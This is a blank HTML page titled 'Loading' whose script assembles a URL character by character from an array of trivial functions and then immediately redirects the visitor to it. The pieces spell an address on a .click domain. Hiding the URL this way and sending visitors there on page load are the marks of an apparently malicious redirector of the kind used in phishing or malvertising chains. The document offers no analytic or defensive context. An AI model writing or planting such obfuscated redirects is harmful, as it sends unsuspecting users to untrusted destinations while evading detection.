<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            function() { return 't'; },
            () => 't',
            function() { return 'p'; },
            _ => 's',
            () => ':',
            _ => '/',
            function() { return '/'; },
            function() { return 'v'; },
            function() { return 'e'; },
            () => 'r',
            function() { return 'g'; },
            function() { return 'e'; },
            _ => 'n',
            function() { return '.'; },
            _ => 'c',
            () => 'l',
            function() { return 'i'; },
            function() { return 'c'; },
            function() { return 'k'; },
            _ => '/',
            () => 's',
            () => '/',
            function() { return 'n'; },
            _ => 'e',
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
